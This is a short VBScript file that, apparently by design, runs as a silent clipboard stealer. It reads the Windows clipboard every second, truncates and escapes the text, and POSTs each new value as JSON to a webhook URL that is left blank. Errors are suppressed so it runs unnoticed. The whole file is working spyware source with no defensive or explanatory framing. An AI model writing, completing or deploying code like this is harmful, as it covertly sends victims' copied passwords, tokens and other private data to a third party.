Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTML = CreateObject("htmlfile")

webhook = ""

lastText = ""

Do
    On Error Resume Next

    current = ""
    current = objHTML.parentWindow.clipboardData.getData("text")

    If Err.Number <> 0 Then
        Err.Clear
        current = ""
    End If

    On Error GoTo 0

    If Not IsNull(current) Then

        current = CStr(current)
        current = Trim(current)

        If Len(current) > 0 Then

            If Len(current) > 1900 Then
                current = Left(current, 1900)
            End If

            safeText = Replace(current, vbCrLf, " ")
            safeText = Replace(safeText, vbCr, " ")
            safeText = Replace(safeText, vbLf, " ")
            safeText = Replace(safeText, """", "'")

            If current <> lastText Then

                json = "{""content"": """ & safeText & """}"

                On Error Resume Next

                Set http = CreateObject("MSXML2.XMLHTTP")
                http.Open "POST", webhook, False
                http.setRequestHeader "Content-Type", "application/json"
                http.Send json

                Err.Clear
                On Error GoTo 0

                lastText = current
            End If
        End If
    End If

    WScript.Sleep 1000
Loop